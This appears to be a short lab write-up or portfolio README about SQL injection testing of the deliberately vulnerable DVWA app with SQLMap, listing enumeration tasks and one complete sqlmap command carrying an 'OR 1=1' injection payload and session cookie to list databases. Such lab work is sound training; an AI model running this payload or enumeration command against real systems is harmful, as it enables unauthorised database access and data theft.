# SQL Injection Lab

## Objective
This lab demonstrates SQL injection testing and database enumeration using SQLMap.

## Tools Used
- Kali Linux
- SQLMap
- DVWA / vulnerable test website

## Tasks Performed
- Tested web application for SQL injection
- Enumerated databases
- Listed tables and columns
- Extracted sample data

## Commands Used
```bash
 sqlmap -u "http://10.79.140.109/dvwa/vulnerabilities/sqli/?id=%27+OR+1%3D1+%23&Submit=Submit#" --cookie="PHPSESSID=32720998fca36704e3a8feedae59ae3d; security=low" --dbs
```

## Skills Demonstrated
- Web application security testing
- SQL injection detection
- Database enumeration
- Vulnerability assessment
